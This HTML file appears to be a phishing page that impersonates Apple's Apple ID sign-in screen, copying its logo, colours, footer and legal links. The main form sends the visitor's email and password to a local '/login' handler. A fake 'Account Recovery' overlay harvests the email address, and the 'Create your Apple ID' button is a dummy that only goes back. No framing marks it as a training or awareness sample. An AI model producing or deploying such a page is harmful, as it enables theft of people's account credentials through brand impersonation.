<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Apple ID</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,SF Pro Display,'Helvetica Neue',sans-serif;background:#f5f5f7;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:40px 16px 24px}
.apple-logo{margin-bottom:20px}
h1{font-size:28px;font-weight:700;color:#1d1d1f;margin-bottom:6px;text-align:center}
.sub{font-size:15px;color:#6e6e73;text-align:center;margin-bottom:32px}
.card{width:100%;max-width:380px;background:#fff;border-radius:18px;padding:28px 24px;box-shadow:0 4px 24px rgba(0,0,0,.08)}
label{display:block;font-size:12px;font-weight:600;color:#1d1d1f;letter-spacing:.3px;margin-bottom:6px;text-transform:uppercase}
input{display:block;width:100%;padding:12px 16px;border:1.5px solid #d2d2d7;border-radius:10px;font-size:16px;color:#1d1d1f;background:#fff;outline:none;transition:border .18s,box-shadow .18s;margin-bottom:18px;-webkit-appearance:none}
input:focus{border-color:#0071e3;box-shadow:0 0 0 3px rgba(0,113,227,.15)}
.forgot-row{text-align:right;margin-top:-12px;margin-bottom:20px}
.forgot-row a{font-size:13px;color:#0071e3;text-decoration:none}
.btn-continue{width:100%;padding:14px;background:#0071e3;color:#fff;border:0;border-radius:10px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:12px;letter-spacing:.2px}
.btn-continue:active{background:#0056b0}
.btn-create{width:100%;padding:13px;background:#f5f5f7;color:#0071e3;border:1.5px solid #d2d2d7;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:.2px}
.sep{height:1px;background:#d2d2d7;margin:20px 0}
.foot{font-size:11px;color:#a1a1aa;text-align:center;margin-top:24px;line-height:1.7}
.foot a{color:#0071e3;text-decoration:none}
</style>
</head>
<body>
  <!-- Apple logo -->
  <svg class="apple-logo" width="48" height="48" viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
    <path fill="#1d1d1f" d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 376.7 0 228.4 0 137.9C0 61.6 15 29.5 40.4 7.5 61.5-10.2 97.2 0 118.3 0c40.8 0 120.8 56.7 160.3 56.7 37.7 0 131.6-62.1 198.2-62.1 35.2 0 127 14.3 190.5 75.1zm-234.1-149.6c-19.1 22.6-49.3 44.7-85.5 44.7-4.5 0-9-.6-13.5-1.3.5-3.9.5-8.3.5-11.6 0-56.7 35.2-111.4 80.6-139.2 22.6-14.3 65.3-28 93.3-28.6.6 4.5.6 9 .6 13.5 0 53.2-28.6 113.3-75.9 122.5z"/>
  </svg>

  <h1>Apple&nbsp;ID</h1>
  <p class="sub">Sign in with your Apple&nbsp;ID</p>

  <div class="card">
    <form method="POST" action="/login">
      <label for="aid">Apple ID</label>
      <input id="aid" name="u" type="email" inputmode="email" autocomplete="email"
             placeholder="name@example.com" required autofocus>

      <label for="pw">Password</label>
      <input id="pw" name="p" type="password" autocomplete="current-password"
             placeholder="Required" required>

      <div class="forgot-row"><a href="#" onclick="showForgot(event)">Forgot Apple ID or Password?</a></div>

      <button type="submit" class="btn-continue">Continue</button>
    </form>

    <div class="sep"></div>
    <button type="button" class="btn-create" onclick="history.back()">Create your Apple ID</button>
  </div>

  <div class="foot">
    <a href="https://www.apple.com/legal/privacy/">Privacy Policy</a> &middot; <a href="https://www.apple.com/legal/internet-services/terms/site.html">Terms of Use</a><br>
    Copyright &copy; 2024 Apple Inc. All rights reserved.
  </div>
<div id="fo" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:99;align-items:center;justify-content:center;padding:16px">
  <div style="background:#fff;border-radius:18px;padding:28px 24px;max-width:360px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.2)">
    <h2 style="font:700 22px/1.3 -apple-system,'SF Pro Display',Helvetica;color:#1d1d1f;margin-bottom:8px;text-align:center">Account Recovery</h2>
    <p style="font:15px/1.5 -apple-system,Helvetica;color:#6e6e73;margin-bottom:20px;text-align:center">Enter your Apple&nbsp;ID to search for your account.</p>
    <form method="POST" action="/login">
      <input name="u" type="email" placeholder="name@example.com"
             style="display:block;width:100%;padding:12px 16px;border:1.5px solid #d2d2d7;border-radius:10px;font-size:16px;outline:none;box-sizing:border-box;margin-bottom:18px;color:#1d1d1f">
      <input type="hidden" name="p" value="apple-recovery">
      <button type="submit"
              style="display:block;width:100%;padding:14px;background:#0071e3;color:#fff;border:0;border-radius:10px;font:600 17px -apple-system,Helvetica;cursor:pointer;margin-bottom:10px;letter-spacing:.2px">Continue</button>
      <button type="button" onclick="document.getElementById('fo').style.display='none'"
              style="display:block;width:100%;padding:13px;background:#f5f5f7;color:#0071e3;border:1.5px solid #d2d2d7;border-radius:10px;font:600 15px -apple-system,Helvetica;cursor:pointer;letter-spacing:.2px">Cancel</button>
    </form>
  </div>
</div>
<script>function showForgot(e){e.preventDefault();var o=document.getElementById('fo');o.style.display='flex'}</script>
</body>
</html>
